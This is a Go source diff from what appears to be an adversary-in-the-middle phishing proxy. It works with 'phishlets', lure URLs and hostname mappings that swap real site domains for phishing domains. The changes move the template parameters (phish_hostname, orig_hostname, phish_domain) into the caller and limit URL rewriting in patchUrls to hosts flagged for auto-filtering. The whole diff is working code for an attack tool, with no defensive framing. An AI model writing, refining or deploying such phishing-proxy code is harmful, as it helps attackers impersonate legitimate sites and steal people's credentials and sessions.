@@ -513,7 +513,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											html = p.injectOgHeaders(l, html)
 
 											body := string(html)
-											body = p.replaceRedirectorParams(body, lure_url, s)
+											phish_domain, _ := pl.cfg.GetSiteDomain(pl.Name)
+											orig_hostname, _ := p.replaceHostWithOriginal(req.URL.Host)
+											params := map[string]string{
+												"lure_url_raw":lure_url,
+												"phish_hostname":o_host,
+												"orig_hostname":orig_hostname,
+												"phish_domain":phish_domain,
+												"phish_basedomain":pl.cfg.general.Domain,
+											}
+											maps.Copy(params, s.Params)
+											body = p.replaceRedirectorParams(body, lure_url, params)
 
 											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 											if resp != nil {
@@ -1602,12 +1612,7 @@ func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
 	return false
 }
 
-func (p *HttpProxy) replaceRedirectorParams(body string, lure_url string, s *Session) string {
-
-	lure_url_raw := lure_url
-	u, _ := url.Parse(lure_url)
-	orig_hostname, _ := p.replaceHostWithOriginal(u.Host)
-
+func (p *HttpProxy) replaceRedirectorParams(body string, lure_url string, params map[string]string) string {
 	// generate forwarder parameter
 	t := make([]byte, 5)
 	rand.Read(t[1:])
@@ -1620,14 +1625,8 @@ func (p *HttpProxy) replaceRedirectorParams(body string, lure_url string, s *Ses
 
 	lure_url += "?" + strings.ToLower(GenRandomString(3)) + "=" + fwd_param
 
-	params := map[string]string{
-		"lure_url_raw":lure_url_raw,
-		"lure_url":lure_url,
-		"phish_hostname":u.Host,
-		"orig_hostname":orig_hostname,
-	}
-	maps.Copy(params, s.Params)
-	body = ReplaceParams(body, s.Params)
+	params["lure_url"] = lure_url
+	body = ReplaceParams(body, params)
 
 	return body
 }
@@ -1640,15 +1639,17 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 		var sub_map map[string]string = make(map[string]string)
 		var hosts []string
 		for _, ph := range pl.proxyHosts {
-			var h string
-			if c_type == CONVERT_TO_ORIGINAL_URLS {
-				h = combineHost(ph.phish_subdomain, phishDomain)
-				sub_map[h] = combineHost(ph.orig_subdomain, ph.domain)
-			} else {
-				h = combineHost(ph.orig_subdomain, ph.domain)
-				sub_map[h] = combineHost(ph.phish_subdomain, phishDomain)
+			if ph.auto_filter {
+				var h string
+				if c_type == CONVERT_TO_ORIGINAL_URLS {
+					h = combineHost(ph.phish_subdomain, phishDomain)
+					sub_map[h] = combineHost(ph.orig_subdomain, ph.domain)
+				} else {
+					h = combineHost(ph.orig_subdomain, ph.domain)
+					sub_map[h] = combineHost(ph.phish_subdomain, phishDomain)
+				}
+				hosts = append(hosts, h)
 			}
-			hosts = append(hosts, h)
 		}
 		// make sure that we start replacing strings from longest to shortest
 		sort.Slice(hosts, func(i, j int) bool {
